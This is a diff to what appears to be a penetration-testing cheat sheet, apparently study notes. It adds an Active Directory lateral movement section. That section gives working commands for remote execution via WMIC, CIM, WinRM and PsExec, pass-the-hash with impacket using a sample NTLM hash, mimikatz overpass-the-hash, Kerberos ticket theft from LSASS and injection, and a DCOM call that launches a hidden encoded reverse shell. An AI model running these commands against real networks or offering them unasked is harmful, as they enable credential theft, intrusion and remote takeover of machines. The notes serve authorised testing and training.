@@ -241,7 +241,7 @@ git config --global color.ui auto
 
 ```
 # Using xfreerdp
- xfreerdp /u:'domain\user' /p:'Password' /v:host_ip:3389 (or another port if 3389 is not the case)
+ xfreerdp /u:'<domain\user>' /p:'<Password>' /v:<host_ip>:3389 (or another port if 3389 is not the case)
 
 # Using rdekstop
 rdesktop ip_address -k es -u user -p pass -d domain
@@ -847,6 +847,82 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desk
 ```
 
 [Back to top](#index)
+
+### Lateral Movement in AD 101
+
+#### WMIC/CIM
+
+```
+# Execute command in another domain joined machine using WMIC
+wmic /node:<target_ip_address> /user:<user> /password:<pass> process call create "calc"
+
+# Execute commmand in another domain joined machine using Invokke-CimMethod (through a CimSession opened with New-CimSession)
+# First create the PsCredential object
+$username = <user>;
+$password = <pass>;
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+# Second, create a CIM session
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName <ip> -Credential $credential -SessionOption $Options 
+$command = 'calc';
+#Invoke the CIM method through the recently created CIM session
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+#### WinRM protocol
+```
+# Execute command in another domain joined computer with winrs (WinRM protocol)
+winrs -r:<target_hostname> -u:<user> -p:<pass>  "cmd /c hostname & whoami"
+
+# Execute command in another domain joined computer with New-PSSession. PsCredential object must be created as shown above.
+# Create the WinRM session
+New-PSSession -ComputerName <target_hostname/IP_address> -Credential $credential
+# Enter the newly created WinRM session
+Enter-PSSession 1
+```
+
+#### PsExec
+```
+# Execute command in another domain joined computer using PSExec
+./PsExec64.exe -i  \\<hostname> -u <domain\user> -p <pass> cmd
+
+```
+
+#### PassTheHash
+```
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+## ToDo -> add other tools used for PTH
+```
+
+#### OverPassTheHash
+```
+# Using mimikatz, leverage the NTLM hash of an user to get a Kerberos Ticket (TGT) as this user and run commands on his behalf avoiding NTLM authentication
+# First open a shell as the user
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
+# Generate a ticket in the newly opened shell
+net use \\<hostname>
+# Use psexec to execute command as him (hostname must be the same as the TGT is only valid in the hostname it was created for.
+.\psexec.exe \\<hostname> cmd
+```
+
+#### Pass The Ticket
+```
+# Export current available tickets from LSASS process memory (TGT's & TGS')
+sekurlsa::tickets /export
+# Inject any of the recently exported TGS' from another user ([some_string]-0-0-32412u01-<username>@<service_name>-<hostname>.kirbi)
+kerberos::ptt <ticket_name.kirbi>
+# Now is possible to access the service as the ticket owner
+```
+
+#### Using DCOM
+```
+# Initiate a remote MMC2.0 application
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
+# Use the ExecuteShellCommand method to execute commands (accpets 4 parameter: Command, Directory, Parameters, and WindowState)
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64_encoded_reverse_shell>","7")
+```
+
 
 ## Port Scanning
 
